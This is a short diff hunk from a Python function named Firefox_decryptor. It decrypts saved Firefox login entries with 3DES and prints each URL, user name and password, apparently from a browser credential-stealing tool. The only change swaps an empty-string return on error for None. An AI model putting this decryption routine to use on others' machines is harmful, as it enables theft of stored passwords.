@@ -358,5 +358,5 @@ def Firefox_decryptor(password, dir):
         output += f'{"*" * 50}\nURL: {i[2]}\nUser Name: {unpad(DES3.new(key, DES3.MODE_CBC, i[0][1]).decrypt(i[0][2]), 8)}\nPassword: {unpad(DES3.new(key, DES3.MODE_CBC, i[1][1]).decrypt(i[1][2]), 8)}\n'
     return output
   except:
-    return ''
+    return None
  
